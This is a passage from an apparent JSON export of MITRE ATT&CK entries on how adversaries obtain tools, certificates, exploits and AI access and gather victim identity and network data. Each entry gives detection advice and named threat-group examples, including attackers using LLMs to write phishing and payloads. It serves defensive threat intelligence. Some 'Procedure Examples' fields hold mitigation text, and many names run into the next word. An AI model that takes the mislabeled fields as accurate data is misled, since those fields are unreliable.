      "DuringNight Dragon, threat actors used Trojans from underground hacker websites.[15]",
      "ForOperation Spalax, the threat actors obtained malware, includingRemcos,njRAT, and AsyncRAT.[16]",
      "TA2541has used multiple strains of malware available for purchase on criminal forums or in open-source repositories.[17]",
      "TA505has used malware such asAzorultandCobalt Strikein their operations.[18]",
      "Turlahas used malware obtained after compromising other threat actors, such asOilRig.[19][20]"
    ]
  },
  "T1588.002": {
    "Name": "Obtain Capabilities:Tool",
    "Description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex:PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such asCobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.[1]Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
    "Detects": [
      "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks inCobalt Strikepayloads.[139]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle."
    ],
    "Procedure Examples": [
      "Aoqin Dragonobtained the Heyoka open source exfiltration tool and subsequently modified it for their operations.[2]",
      "APT-C-36obtained and used a modified variant ofImminent Monitor.[3]",
      "APT1has used various open-source tools for privilege escalation purposes.[4]",
      "APT19has obtained and used publicly-available tools likeEmpire.[5][6]",
      "APT28has obtained and used open-source tools likeKoadic,Mimikatz, andResponder.[7][8][9]",
      "APT29has obtained and used a variety of tools includingMimikatz,SDelete,Tor,meek, andCobalt Strike.[10][11][12]",
      "APT32has obtained and used tools such asMimikatzandCobalt Strike, and a variety of other open-source tools from GitHub.[13][14]",
      "APT33has obtained and leveraged publicly-available tools for early intrusion activities.[15][16]",
      "APT38has obtained and used open-source tools such asMimikatz.[17]",
      "APT39has modified and used customized versions of publicly-available tools like PLINK andMimikatz.[18][19]",
      "APT41has obtained and used tools such asMimikatz,pwdump,PowerSploit, andWindows Credential Editor.[20]",
      "APT42has used built-in features in the Microsoft 365 environment and publicly available tools to avoid detection.[21]",
      "Aquatic Pandahas acquired and usedCobalt Strikein its operations.[22]",
      "BackdoorDiplomacyhas obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.[23]",
      "BITTERhas obtained tools such as PuTTY for use in their operations.[24]",
      "BlackTechhas obtained and used tools such as Putty, SNScan, andPsExecfor its operations.[25]",
      "Blue Mockingbirdhas obtained and used tools such asMimikatz.[26]",
      "BRONZE BUTLERhas obtained and used open-source tools such asMimikatz,gsecdump, andWindows Credential Editor.[27]",
      "ForC0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.[28]",
      "ForC0015, the threat actors obtained a variety of tools, includingAdFind,  AnyDesk, and Process Hacker.[29]",
      "ForC0017,APT41obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.[30]",
      "ForC0018, the threat actors acquired a variety of open source tools, includingMimikatz,Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.[31][32]",
      "ForC0021, the threat actors usedCobalt Strikeconfigured with a modified variation of the publicly available Pandora Malleable C2 Profile.[33][34]",
      "DuringC0027,Scattered Spiderobtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner.[35]",
      "During theC0032campaign,TEMP.Velesobtained and used tools such as Mimikatz and PsExec.[36]",
      "Carbanakhas obtained and used open-source tools such asPsExecandMimikatz.[37]",
      "Chimerahas obtained and used tools such asBloodHound,Cobalt Strike,Mimikatz, andPsExec.[38][39]",
      "Cinnamon Tempesthas used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage.[40][41]",
      "Cleaverhas obtained and used open-source tools such asPsExec,Windows Credential Editor, andMimikatz.[42]",
      "Cobalt Grouphas obtained and used a variety of tools includingMimikatz,PsExec,Cobalt Strike, andSDelete.[43]",
      "CopyKittenshas used Metasploit,Empire, and AirVPN for post-exploitation activities.[44][45]",
      "DuringCostaRicto, the threat actors obtained open source tools to use in their operations.[46]",
      "DuringCutting Edge, threat actors leveraged tools including Interactsh to identify vulnerable targets, PySoxy to simultaneously dispatch traffic between multiple endpoints, BusyBox to enable post exploitation activities, and Kubo Injector to inject shared objects into process memory.[47][48]",
      "DarkHydrushas obtained and used tools such asMimikatz,Empire, andCobalt Strike.[49]",
      "DarkVishnyahas obtained and used tools such asImpacket,Winexe, andPsExec.[50]",
      "Dragonflyhas obtained and used tools such asMimikatz,CrackMapExec, andPsExec.[51]",
      "Earth Luscahas acquired and used a variety of open source tools.[52]",
      "Ferocious Kittenhas obtained open source tools for its operations, including JsonCPP and Psiphon.[53]",
      "FIN10has relied on publicly-available software to gain footholds and establish persistence in victim environments.[54]",
      "FIN13has utilized publicly available tools such asMimikatz,Impacket, PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts.[55]",
      "FIN5has obtained and used a customized version ofPsExec, as well as use other tools such aspwdump,SDelete, andWindows Credential Editor.[56]",
      "FIN6has obtained and used tools such asMimikatz,Cobalt Strike, andAdFind.[57][58]",
      "FIN7has utilized a variety of tools such asCobalt Strike,PowerSploit, and the remote management tool, Atera for targeting efforts.[59]",
      "FIN8has used open-source tools such asImpacketfor targeting efforts.[60]",
      "ForFrankenstein, the threat actors obtained and usedEmpire.[61]",
      "ForFunnyDream, the threat actors used a modified version of the open sourcePcShareremote administration tool.[62]",
      "GALLIUMhas used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.[63]",
      "Gamaredon Grouphas used various legitimate tools, such asmshta.exeandReg, and services during operations.[64]",
      "Gorgon Grouphas obtained and used tools such asQuasarRATandRemcos.[65]",
      "HEXANEhas acquired, and sometimes customized, open source tools such asMimikatz,Empire, VNC remote access software, and DIG.net.[66][67][68]",
      "DuringHomeLand Justice, threat actors used tools including Advanced Port Scanner,Mimikatz, andImpacket.[69][70]",
      "INC Ransomhas acquired and used several tools including MegaSync, AnyDesk,esentutlandPsExec.[71][72][73][74][75]",
      "Inceptionhas obtained and used open-source tools such asLaZagne.[76]",
      "IndigoZebrahas acquired open source tools such asNBTscanand Meterpreter for their operations.[77][78]",
      "Ke3changhas obtained and used tools such asMimikatz.[79]",
      "Kimsukyhas obtained and used tools such as Nirsoft WebBrowserPassVIew,Mimikatz, andPsExec.[80][81][82]",
      "LAPSUS$has obtained tools such as RVTools and AD Explorer for their operations.[83][84]",
      "Lazarus Grouphas obtained a variety of tools for their operations, includingResponderand PuTTy PSCP.[85]",
      "Leafminerhas obtained and used tools such asLaZagne,Mimikatz,PsExec, andMailSniper.[86]",
      "Lotus Blossomhas used publicly-available tools such as a Python-based cookie stealer for Chrome browsers,Impacket, and the Venom proxy tool.[87]",
      "LuminousMothhas obtained an ARP spoofing tool from GitHub.[88]",
      "Magic Houndhas obtained and used tools likeHavij,sqlmap, Metasploit,Mimikatz, and Plink.[89][90][91][92][93]",
      "menuPasshas used and modified open-source tools likeImpacket,Mimikatz, andpwdump.[94]",
      "Metadorhas used Microsoft's Console Debugger in some of their operations.[95]",
      "Moses Staffhas used the commercial tool DiskCryptor.[96]",
      "MuddyWater has used legitimate toolsConnectWise,RemoteUtilities, and SimpleHelp to gain access to the target environment.[97][98]",
      "DuringNight Dragon, threat actors obtained and used tools such asgsecdump.[99]",
      "OilRighas made use of the publicly available tools including Plink andMimikatz.[100][101]",
      "ForOperation CuckooBees, the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.[102]",
      "ForOperation Dream Job,Lazarus Groupobtained tools such as Wake-On-Lan,Responder, ChromePass, and dbxcli.[103][104]",
      "DuringOperation MidnightEclipse, threat actors used the GO Simple Tunnel (GOST) reverse proxy tool.[105]",
      "ForOperation Spalax, the threat actors obtained packers such as CyaX.[106]",
      "ForOperation Wocao, the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, andBloodHound.[107]",
      "Patchworkhas obtained and used open-source tools such asQuasarRAT.[108]",
      "PittyTigerhas obtained and used tools such asMimikatzandgsecdump.[109]",
      "Playhas used multiple tools for discovery and defense evasion purposes on compromised hosts.[110]",
      "POLONIUMhas obtained and used tools such as AirVPN and plink in their operations.[45]",
      "Salt Typhoonhas used publicly available tooling to exploit vulnerabilities.[111]",
      "Sandworm Teamhas acquired open-source tools for their operations, includingInvoke-PSImage, which was used to establish an encrypted channel from a compromised host toSandworm Team's C2 server in preparation for the 2018 Winter Olympics attack, as well asImpacketand RemoteExec, which were used in their 2022Prestigeoperations.[112][113]Additionally,Sandworm Teamhas usedEmpire,Cobalt StrikeandPoshC2.[114]",
      "Sea Turtlehas used tools such as Adminer during intrusions.[115]",
      "DuringShadowRay, threat actors used tools including the XMRig miner and Interactsh.[116]",
      "Silencehas obtained and modified versions of publicly-available tools likeEmpireandPsExec.[117][118]",
      "Silent Librarianhas obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.[119][120]",
      "SPACEHOP Activityleverages a C2 framework sourced from a publicly-available Github repository for administration of relay nodes.[121]",
      "Star Blizzardhas incorporated the open-source EvilGinx framework into their spearphishing activity.[122][123]",
      "Storm-1811acquired various legitimate and malicious tools, such as RMM software and commodity malware packages, for operations.[124][125]",
      "TA2541has used commodity remote access tools.[126]",
      "TA505has used a variety of tools in their operations, includingAdFind,BloodHound,Mimikatz, andPowerSploit.[127]",
      "Threat Group-3390has obtained and used tools such asImpacket,pwdump,Mimikatz,gsecdump,NBTscan, andWindows Credential Editor.[128][129]",
      "Thriphas obtained and used tools such asMimikatzandPsExec.[130]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesused tools such as Mimikatz and other open-source software.[131]",
      "Turlahas obtained and customized publicly-available tools likeMimikatz.[132]",
      "Volt Typhoonhas used legitimate network and forensic tools and customized versions of open-source tools for C2.[133][134]",
      "Whiteflyhas obtained and used tools such asMimikatz.[135]",
      "WIRTEhas obtained and usedEmpirefor post-exploitation activities.[136]",
      "Wizard Spiderhas utilized tools such asEmpire,Cobalt Strike,Cobalt Strike,Rubeus,AdFind,BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts.[137][138]"
    ]
  },
  "T1588.003": {
    "Name": "Obtain Capabilities:Code Signing Certificates",
    "Description": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.[1]Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior toCode Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
    "Detects": [
      "Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such asCode SigningorInstall Root Certificate."
    ],
    "Procedure Examples": [
      "APT41 DUSTused stolen code signing certificates to signDUSTTRAPmalware and components.[2]",
      "BlackTechhas used stolen code-signing certificates for its malicious payloads.[3]",
      "FIN8has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers.[4]",
      "DuringHomeLand Justice, threat actors used tools with legitimate code signing certificates.[5]",
      "Kimsukyhas stolen a valid certificate that is used to sign the malware and the dropper.[6]",
      "MegaCortexhas used code signing certificates issued to fake companies to bypass security controls.[7]",
      "OilRighas obtained stolen code signing certificates to digitally sign malware.[8]",
      "DuringOperation Dream Job,Lazarus Groupused code signing certificates issued by Sectigo RSA for some of its malware and tools.[9]",
      "Threat Group-3390has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations.[10]",
      "Wizard Spiderhas obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads.[11][12]"
    ]
  },
  "T1588.004": {
    "Name": "Obtain Capabilities:Digital Certificates",
    "Description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex:Asymmetric CryptographywithWeb Protocols) or even enablingAdversary-in-the-Middleif the certificate is trusted or otherwise added to the root of trust (i.e.Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.[1]Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.[2]After obtaining a digital certificate, an adversary may then install that certificate (seeInstall Digital Certificate) on infrastructure under their control.",
    "Detects": [
      "Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.[13]Some server-side components of adversary tools may have default values set for SSL/TLS certificates.[14]",
      "Monitor for logged network traffic in response to a scan showing both protocol header and body values that may buy and/or steal SSL/TLS certificates that can be used during targeting. Detection efforts may be focused on related behaviors, such asWeb Protocols,Asymmetric Cryptography, and/orInstall Root Certificate."
    ],
    "Procedure Examples": [
      "BlackTechhas used valid, stolen digital certificates for some of their malware and tools.[3]",
      "Indian Critical Infrastructure Intrusionsincluded the use of digital certificates spoofing Microsoft.[4]",
      "Lazarus Grouphas obtained SSL certificates for their C2 domains.[5]",
      "LuminousMothhas used a valid digital certificate for some of their malware.[6]",
      "ForOperation Honeybee, the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.[7]",
      "Mustang Pandaacquired Cloudflare Origin CA TLS certificates duringRedDelta Modified PlugX Infection Chain Operations.[8]",
      "Sea Turtlecreated new certificates using a technique called the actors performed \"certificate impersonation,\" a technique in whichSea Turtleobtained a certificate authority-signed X.509 certificate from another provider for the same domain imitating the one already used by the targeted organization.[9][10]",
      "Silent Librarianhas obtained free Let's Encrypt SSL certificates for use on their phishing pages.[11][12]"
    ]
  },
  "T1588.005": {
    "Name": "Obtain Capabilities:Exploits",
    "Description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.[1][2][3]In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.[4][5]In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).[2]An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.Adversaries may use exploits during various phases of the adversary lifecycle (i.e.Exploit Public-Facing Application,Exploitation for Client Execution,Exploitation for Privilege Escalation,Exploitation for Defense Evasion,Exploitation for Credential Access,Exploitation of Remote Services, andApplication or System Exploitation).",
    "Detects": [],
    "Procedure Examples": [
      "Ember Bearhas obtained exploitation scripts against publicly-disclosed vulnerabilities from public repositories.[6]",
      "Kimsukyhas obtained exploit code for various CVEs.[7]"
    ]
  },
  "T1588.006": {
    "Name": "Obtain Capabilities:Vulnerabilities",
    "Description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.[1]An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e.Exploits) or to attempt to develop one themselves (i.e.Exploits).",
    "Detects": [],
    "Procedure Examples": [
      "Leviathanweaponized publicly-known vulnerabilities for initial access and other purposes duringLeviathan Australian Intrusions.[2]",
      "In 2017,Sandworm Teamconducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.[3]",
      "Volt Typhoonhas used publicly available exploit code for initial access.[4]"
    ]
  },
  "T1588.007": {
    "Name": "Obtain Capabilities:Artificial Intelligence",
    "Description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conductingReconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.[1]For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used inPhishing/Phishing for Informationcampaigns. The same publicly available tool may further enable vulnerability or other offensive research supportingDevelop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g.,Obfuscated Files or Information) malicious scripts and payloads.[2]Finally, AI-generated text, images, audio, and video may be used for fraud,Impersonation, and other malicious activities.[3][4][5]",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
    ]
  },
  "T1589": {
    "Name": "Gather Victim Identity Information",
    "Description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about users could also be enumerated via other active means (i.e.Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.[1][2]Information about victims may also be exposed to adversaries via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[3][4][5][6][7][8][9][10]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorPhishing for Information), establishing operational resources (ex:Compromise Accounts), and/or initial access (ex:PhishingorValid Accounts).",
    "Detects": [
      "Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields."
    ],
    "Procedure Examples": [
      "APT32has conducted targeted surveillance against activists and bloggers.[11]",
      "FIN13has researched employees to target for social engineering attacks.[12]",
      "HEXANEhas identified specific potential victims at targeted organizations.[13]",
      "LAPSUS$has gathered detailed information of target employees to enhance their social engineering lures.[14]",
      "Magic Houndhas acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.[15]",
      "ForOperation Dream Job,Lazarus Groupconducted extensive reconnaissance research on potential targets.[16]",
      "DuringOperation Wocao, threat actors targeted people based on their organizational roles and privileges.[17]",
      "Star Blizzardhas identified ways to engage targets by researching potential victims' interests and social or professional contacts.[18]",
      "Volt Typhoonhas gathered victim identify information during pre-compromise reconnaissance.[19]"
    ]
  },
  "T1589.001": {
    "Name": "Gather Victim Identity Information:Credentials",
    "Description": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.Adversaries may gather credentials from potential victims in various ways, such as direct elicitation viaPhishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.[1][2][3][4][5][6][7][8]Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).[9]Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex:Search Engines, breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.[10][11][12]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorPhishing for Information), establishing operational resources (ex:Compromise Accounts), and/or initial access (ex:External Remote ServicesorValid Accounts).",
    "Detects": [],
    "Procedure Examples": [
      "APT28has harvested user's login credentials.[13]",
      "DuringC0027,Scattered Spidersent phishing messages via SMS to steal credentials.[14]",
      "Chimerahas collected credentials for the target organization from previous breaches for use in brute force attacks.[15]",
      "LAPSUS$has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials.[16][17]",
      "Leviathanhas collected compromised credentials to use for targeting efforts.[18]",
      "Magic Houndgathered credentials from two victims that they then attempted to validate across 75 different websites.Magic Houndhas also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel.[19][20]",
      "For theSolarWinds Compromise,APT29conducted credential theft operations to obtain credentials to be used for access to victim environments.[21]"
    ]
  },
  "T1589.002": {
    "Name": "Gather Victim Identity Information:Email Addresses",
    "Description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[1][2]Email addresses could also be enumerated via more active means (i.e.Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.[3]For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.[4][5]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorPhishing for Information), establishing operational resources (ex:Email Accounts), and/or initial access (ex:PhishingorBrute ForceviaExternal Remote Services).",
    "Detects": [
      "Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields."
    ],
    "Procedure Examples": [
      "AADInternalscan check for the existence of user email addresses using public Microsoft APIs.[6][7]",
      "APT32has collected e-mail addresses for activists and bloggers in order to target them with spyware.[8]",
      "EXOTIC LILYhas gathered targeted individuals' e-mail addresses through open source research and website contact forms.[9]",
      "HAFNIUMhas collected e-mail addresses for users they intended to target.[10]",
      "HEXANEhas targeted executives, human resources staff, and IT personnel for spearphishing.[11][12]",
      "Kimsukyhas collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering.[13][14][15]",
      "LAPSUS$has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts.[16]",
      "Lazarus Groupcollected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.[17]",
      "Magic Houndhas identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting.[18][19]",
      "Moonstone Sleetgathered victim email address information for follow-on phishing activity.[20]",
      "Saint Beargathered victim email information in advance of phishing operations for targeted attacks.[21]",
      "Sandworm Teamhas obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.[22]",
      "Silent Librarianhas collected e-mail addresses from targeted organizations from open Internet searches.[23]",
      "TA551has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.[24]",
      "Volt Typhoonhas targeted the personal emails of key network and IT staff at victim organizations.[25]",
      "Water Curupira Pikabot Distributionutilizes thread spoofing of existing email threads in order to execute spear phishing operations.[26]"
    ]
  },
  "T1589.003": {
    "Name": "Gather Victim Identity Information:Employee Names",
    "Description": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorPhishing for Information), establishing operational resources (ex:Compromise Accounts), and/or initial access (ex:PhishingorValid Accounts).",
    "Detects": [],
    "Procedure Examples": [
      "Kimsukyhas collected victim employee name information.[2]",
      "Sandworm Team's research of potential victim organizations included the identification and collection of employee information.[3]",
      "Silent Librarianhas collected lists of names for individuals from targeted organizations.[4]"
    ]
  },
  "T1590": {
    "Name": "Gather Victim Network Information",
    "Description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions viaActive ScanningorPhishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex:Search Open Technical Databases).[1][2][3]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:Trusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "HAFNIUMgathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.[4]",
      "Indrik Spiderhas downloaded tools, such as the Advanced Port Scanner utility and Lansweeper, to conduct internal reconnaissance of the victim network.Indrik Spiderhas also accessed the victim’s VMware VCenter, which had information about host configuration, clusters, etc.[5]",
      "Volt Typhoonhas conducted extensive pre-compromise reconnaissance to learn about the target organization’s network.[6]"
    ]
  },
  "T1590.001": {
    "Name": "Gather Victim Network Information:Domain Properties",
    "Description": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.Adversaries may gather this information in various ways, such as direct collection actions viaActive ScanningorPhishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex:WHOIS).[1][2][3]Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.[4][5]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Technical Databases,Search Open Websites/Domains, orPhishing for Information), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:Phishing).",
    "Detects": [],
    "Procedure Examples": [
      "AADInternalscan gather information about a tenant’s domains using public Microsoft APIs.[6][7]",
      "Sandworm Teamconducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.[8]"
    ]
  },
  "T1590.002": {
    "Name": "Gather Victim Network Information:DNS",
    "Description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.[1]Adversaries may gather this information in various ways, such as querying or otherwise collecting details viaDNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex:Search Open Technical Databases).[2][3]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Technical Databases,Search Open Websites/Domains, orActive Scanning), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:External Remote Services).Adversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.[4][5][6]",
    "Detects": [],
    "Procedure Examples": [
      "Consider implementing policies for DNS servers, such as Zone Transfer Policies, that enforce a list of validated servers permitted for zone transfers.[7]"
    ]
  },
  "T1590.003": {
    "Name": "Gather Victim Network Information:Network Trust Dependencies",
    "Description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex:Search Open Technical Databases).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:Trusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1590.004": {
    "Name": "Gather Victim Network Information:Network Topology",
    "Description": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.Adversaries may gather this information in various ways, such as direct collection actions viaActive ScanningorPhishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex:Search Victim-Owned Websites).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Technical DatabasesorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:External Remote Services).",
    "Detects": [],
    "Procedure Examples": [
      "FIN13has searched for infrastructure that can provide remote access to an environment for targeting efforts.[2]",
      "Salt Typhoonhas used configuration files from exploited network devices to help discover upstream and downstream network segments.[3]",
      "Volt Typhoonhas conducted extensive reconnaissance of victim networks including identifying network topologies.[4]"
    ]
  },
  "T1590.005": {
    "Name": "Gather Victim Network Information:IP Addresses",
